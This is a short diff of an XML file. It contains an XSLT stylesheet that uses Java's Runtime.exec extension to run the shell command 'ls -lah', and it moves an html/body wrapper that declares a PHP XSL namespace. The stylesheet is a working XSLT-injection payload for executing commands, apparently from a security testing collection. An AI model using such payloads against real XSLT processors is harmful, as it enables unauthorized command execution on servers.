@@ -1,13 +1,14 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
-<body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
-===========================================
               <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:java="java">
                <xsl:template match="/" xmlns:os="java:lang.Runtime" >
                 <xsl:variable name="runtime" select="java:lang.Runtime.getRuntime()"/>
                 <xsl:value-of select="os:exec($runtime, 'ls -lah')" />
                </xsl:template>
               </xsl:stylesheet>
+<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
+<body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
+===========================================
+
 
   
 ===========================================
